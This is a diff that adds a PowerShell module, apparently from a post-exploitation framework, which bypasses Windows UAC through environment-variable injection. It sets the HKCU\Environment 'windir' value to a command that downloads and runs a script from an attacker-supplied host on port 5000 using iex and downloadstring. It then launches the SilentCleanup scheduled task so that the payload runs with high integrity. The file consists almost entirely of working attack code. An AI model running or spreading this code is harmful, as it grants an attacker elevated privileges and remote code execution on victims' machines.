@@ -1,0 +1,53 @@
+#Title: invoke-environmentInjection
+#Technique: T1088
+#Tactic: TA0004 / TA0005
+
+function invoke-environmentInjection {
+
+    param(
+      [String] $ip
+    )
+
+    #default values
+    $good = $false
+    $results = "UAC bypass not completed"
+
+    $path = 'hkcu:\environment'
+
+    #check if exist hkcu:\environment
+    $properties = Get-ItemProperty -Path $path -Name 'windir' -ErrorAction SilentlyContinue
+    if (-not($properties)) {
+        echo "Path doesn't exist"
+        echo  "Creating path"
+    }
+    else {
+        Remove-ItemProperty -Path $path -Name 'windir'
+    }
+
+    $uri = "http://" + $ip + ":5000/consola"
+    $id=$global:id
+    $command="iex(new-object net.webclient).downloadstring('"+$uri+"');consola -id $id"
+    $value =  "cmd /K c:\windows\system32\windowspowershell\v1.0\powershell.exe -W maximized -C "+$command+" && REM "
+    #Create windir injection
+    New-ItemProperty -Name 'windir' -Path 'hkcu:\environment' -Value $value
+
+    #Task (high integrity)
+    schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+    
+    $good = $true
+    $results = "UAC bypass completed successfully" 
+
+    #Return results
+    return @{results = $results|Out-String; success = $good }
+
+}
+
+#Main
+
+#GiveMeData if needed
+
+#pdd
+$execute = invoke-environmentInjection -ip $global:remoteip
+return @{results = $execute.results|Out-String ; success = $execute.success; }
+
+#PutData if needed
